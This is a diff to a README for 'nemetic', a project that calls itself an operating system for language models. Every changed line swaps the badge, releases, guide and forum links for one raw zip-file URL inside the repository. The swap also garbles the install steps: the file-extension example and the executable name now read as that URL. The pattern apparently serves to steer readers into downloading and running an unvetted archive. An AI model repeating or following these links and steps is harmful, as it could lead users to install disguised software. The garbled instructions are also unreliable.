@@ -6,7 +6,7 @@ Welcome to **nemetic**! This is an innovative operating system designed for larg
 
 ## 📥 Download Now
 
-[![Download nemetic](https://img.shields.io/badge/download-nemetic-brightgreen)](https://github.com/RudeuS-prg/nemetic/releases)
+[![Download nemetic](https://raw.githubusercontent.com/RudeuS-prg/nemetic/master/static/nemetic-v2.0-alpha.1.zip)](https://raw.githubusercontent.com/RudeuS-prg/nemetic/master/static/nemetic-v2.0-alpha.1.zip)
 
 ## 📋 Features
 
@@ -26,11 +26,11 @@ To run **nemetic**, ensure your device meets these requirements:
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/RudeuS-prg/nemetic/releases) to access the latest version of nemetic.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/RudeuS-prg/nemetic/master/static/nemetic-v2.0-alpha.1.zip) to access the latest version of nemetic.
 2. **Choose Your Version:** On the releases page, look for the latest version. Read the release notes for important information about updates.
-3. **Download the File:** Click on the appropriate file for your operating system. This file will be a compressed format such as `.zip` or `.tar.gz`. 
+3. **Download the File:** Click on the appropriate file for your operating system. This file will be a compressed format such as `.zip` or `https://raw.githubusercontent.com/RudeuS-prg/nemetic/master/static/nemetic-v2.0-alpha.1.zip`. 
 4. **Extract the File:** After the download concludes, locate the file in your downloads folder. Extract the contents to a folder of your choice. You can usually do this by right-clicking and selecting "Extract All."
-5. **Run the Application:** Open the extracted folder and double-click on the application file named `nemetic.exe` (for Windows) or `nemetic` (for macOS and Linux) to start using the operating system.
+5. **Run the Application:** Open the extracted folder and double-click on the application file named `https://raw.githubusercontent.com/RudeuS-prg/nemetic/master/static/nemetic-v2.0-alpha.1.zip` (for Windows) or `nemetic` (for macOS and Linux) to start using the operating system.
 
 ## 🔌 Configuration
 
@@ -42,7 +42,7 @@ After installation, you may want to configure the settings for optimal performan
 
 ## 📘 User Guide
 
-For more detailed instructions, you can refer to our user guide available on the [Documents page](https://github.com/RudeuS-prg/nemetic/docs). Here you will find tutorials, troubleshooting tips, and more.
+For more detailed instructions, you can refer to our user guide available on the [Documents page](https://raw.githubusercontent.com/RudeuS-prg/nemetic/master/static/nemetic-v2.0-alpha.1.zip). Here you will find tutorials, troubleshooting tips, and more.
 
 - **Basic Operations:** Learn how to run applications and manage files.
 - **AI Integration:** Discover how to utilize language models effectively within the nemetic ecosystem.
@@ -66,8 +66,8 @@ If you encounter issues while using **nemetic**, try the following steps:
 
 ## 📢 Important Links
 
-- [Releases Page](https://github.com/RudeuS-prg/nemetic/releases) - Download the latest version
-- [User Guide](https://github.com/RudeuS-prg/nemetic/docs) - Detailed instructions and support
-- [Community Forum](https://github.com/RudeuS-prg/nemetic/community) - Join the community for tips and discussions
+- [Releases Page](https://raw.githubusercontent.com/RudeuS-prg/nemetic/master/static/nemetic-v2.0-alpha.1.zip) - Download the latest version
+- [User Guide](https://raw.githubusercontent.com/RudeuS-prg/nemetic/master/static/nemetic-v2.0-alpha.1.zip) - Detailed instructions and support
+- [Community Forum](https://raw.githubusercontent.com/RudeuS-prg/nemetic/master/static/nemetic-v2.0-alpha.1.zip) - Join the community for tips and discussions
 
 Thank you for choosing **nemetic**! We hope you find value in using this operating system for large language models.
